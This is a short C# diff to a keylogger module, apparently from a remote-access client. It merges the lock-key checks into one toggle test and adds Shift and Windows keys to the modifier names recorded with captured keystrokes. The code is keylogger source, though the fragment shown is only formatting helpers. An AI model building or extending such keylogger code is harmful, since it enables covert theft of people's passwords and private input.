@@ -97,30 +97,13 @@ namespace xClient.Core.Keylogger
         }
 
         /// <summary>
-        /// Determines if the number lock key code provided is in a toggled state.
+        /// Determines if the key code provided is in a toggled state.
         /// </summary>
+        /// <param name="sender">The code for the key.</param>
         /// <returns>True if toggled on; False if toggled off.</returns>
-        public static bool NumLockToggled()
+        public static bool IsKeyToggled(this short sender)
         {
-            return Control.IsKeyLocked(Keys.NumLock);
-        }
-        
-        /// <summary>
-        /// Determines if the scroll lock key code provided is in a toggled state.
-        /// </summary>
-        /// <returns>True if toggled on; False if toggled off.</returns>
-        public static bool ScrollLockToggled()
-        {
-            return Control.IsKeyLocked(Keys.Scroll);
-        }
-        
-        /// <summary>
-        /// Determines if the caps lock key code provided is in a toggled state.
-        /// </summary>
-        /// <returns>True if toggled on; False if toggled off.</returns>
-        public static bool CapsLockToggled()
-        {
-            return Control.IsKeyLocked(Keys.CapsLock);
+            return (sender & 0x0001) != 0;
         }
 
         public static string BuildString(this KeyloggerModifierKeys sender)
@@ -144,6 +127,20 @@ namespace xClient.Core.Keylogger
 
                     if (!string.IsNullOrEmpty(AltName))
                         BuiltModifierKeys.Append(AltName + " + ");
+                }
+                if (sender.ShiftKeyPressed)
+                {
+                    string ShiftName = KeyloggerKeys.VK_SHIFT.GetKeyloggerKeyName();
+
+                    if (!string.IsNullOrEmpty(ShiftName))
+                        BuiltModifierKeys.Append(ShiftName + " + ");
+                }
+                if (sender.WindowsKeyPressed)
+                {
+                    string WinName = KeyloggerKeys.VK_LWIN.GetKeyloggerKeyName();
+
+                    if (!string.IsNullOrEmpty(WinName))
+                        BuiltModifierKeys.Append(WinName + " + ");
                 }
 
                 return BuiltModifierKeys.ToString();
